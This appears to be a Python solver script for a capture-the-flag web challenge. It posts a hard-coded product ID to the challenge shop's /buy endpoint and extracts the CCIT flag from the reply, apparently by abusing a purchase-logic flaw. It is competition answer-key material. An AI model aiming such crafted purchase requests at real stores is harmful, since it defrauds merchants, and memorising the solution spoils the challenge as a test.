#!/bin/python3

import json
import logging
import os
import random
import string
import re

import requests

logging.disable()

# Per le challenge web
URL = os.environ.get("URL", "http://yasc.challs.external.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

session = requests.Session()

session.get(f'{URL}/')

res = session.post(
    f'{URL}/buy', data={'product_id': '43d27d66-150b-4b41-a1ee-6c3e02c0a67c'})

print(re.findall(r'CCIT{.*}', res.text)[0])
